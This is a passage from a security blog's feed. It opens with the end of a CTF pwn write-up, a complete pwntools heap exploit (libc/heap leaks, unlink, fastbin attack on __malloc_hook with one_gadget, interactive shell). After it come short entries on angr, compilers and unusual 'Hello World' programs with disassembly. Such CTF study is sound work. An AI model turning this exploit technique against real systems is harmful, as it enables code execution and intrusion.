class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python3 angr 学习笔记</title>
    <link href="https://nocbtm.github.io/2020/05/21/python3-angr-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nocbtm.github.io/2020/05/21/python3-angr-学习笔记/</id>
    <published>2020-05-21T08:44:17.000Z</published>
    <updated>2020-05-24T11:44:29.963Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-12T00:40:29.178Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19RptFmvx8pCV8I6NKJtxZtuc6qg45m990= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         